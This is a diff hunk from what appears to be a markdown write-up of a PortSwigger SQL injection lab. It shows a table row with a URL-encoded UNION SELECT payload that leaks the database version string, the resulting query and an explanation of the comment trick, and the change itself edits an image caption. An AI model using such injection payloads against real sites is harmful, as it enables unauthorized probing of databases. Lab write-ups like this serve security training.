@@ -35,7 +35,7 @@ Because the application blindly concatenates user-supplied text into a `WHERE` c
 | 4 | **Leaked version string** with<br>`/filter?category=Gifts'/**%20**UNION%20SELECT%20'a',@@version%23` | `SELECT * FROM someTable WHERE category='Gifts' UNION SELECT 'a', @@version#'` | `#` starts a comment in MySQL; everything after is ignored. Page prints the full MySQL/MSSQL banner (e.g., `MySQL 8.0.36-log` or `Microsoft SQL Server 2019 ...`). Lab flags success. |
 
 ![Lab banner – PortSwigger Practitioner level](3.png)
-> Leaked version string
+> Leaked version string using NULL instead of 'a'
 
 ---
 
